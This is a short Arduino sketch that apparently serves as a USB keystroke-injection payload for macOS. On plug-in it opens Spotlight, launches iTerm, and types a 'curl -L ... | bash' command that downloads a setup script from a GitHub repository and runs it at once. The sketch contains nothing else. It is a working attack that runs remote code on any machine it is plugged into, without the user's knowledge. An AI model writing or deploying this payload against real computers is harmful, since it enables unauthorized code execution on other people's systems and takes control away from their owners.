#include <Keyboard.h>

void setup()
{
  Keyboard.begin();
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(3000);

  Keyboard.println("iterm");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000);

  Keyboard.println("curl -L 'https://github.com/4n4k1n/Goose/raw/main/setUp.sh' | bash");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop()
{
  // Nothing
}

